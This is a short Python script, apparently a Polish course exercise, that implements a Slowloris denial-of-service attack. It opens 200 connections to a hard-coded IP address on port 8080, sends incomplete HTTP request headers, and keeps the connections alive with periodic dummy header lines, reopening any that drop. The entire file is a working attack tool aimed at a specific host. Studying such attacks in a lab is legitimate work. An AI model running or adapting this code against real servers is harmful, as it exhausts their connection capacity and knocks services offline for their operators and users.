# Tak samo jako w zadaniu 3 
import socket
import time

TARGET = "212.182.24.27"
PORT = 8080
NUM_SOCKETS = 200
INTERVAL = 15   

INITIAL_HEADERS = (
    f"GET / HTTP/1.1\r\n"
    f"Host: {TARGET}\r\n"
    f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
    f"Accept-Language: en-US,en;q=0.9\r\n"
).encode()

KEEPALIVE = b"X-a: b\r\n"


def create_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((TARGET, PORT))
        s.sendall(INITIAL_HEADERS)
        return s
    except Exception:
        return None


def main():
    print(f"Slowloris: cel {TARGET}:{PORT}, sockets={NUM_SOCKETS}, interval={INTERVAL}s")
    print("Inicjalizacja połączeń...")

    sockets = []
    for i in range(NUM_SOCKETS):
        s = create_socket()
        if s:
            sockets.append(s)
        if (i + 1) % 50 == 0:
            print(f"  Otwarto {len(sockets)}/{i+1} połączeń")

    print(f"Gotowe: {len(sockets)} aktywnych połączeń. Ctrl+C = stop.\n")

    iteration = 0
    while True:
        iteration += 1
        dead = []

        for s in sockets:
            try:
                s.sendall(KEEPALIVE)
            except Exception:
                dead.append(s)

        # Odbuduj zerwane połączenia
        for s in dead:
            sockets.remove(s)
            new_s = create_socket()
            if new_s:
                sockets.append(new_s)

        print(f"[{iteration}] Aktywne: {len(sockets)}, zerwane/odbudowane: {len(dead)}")
        time.sleep(INTERVAL)


if __name__ == "__main__":
    main()
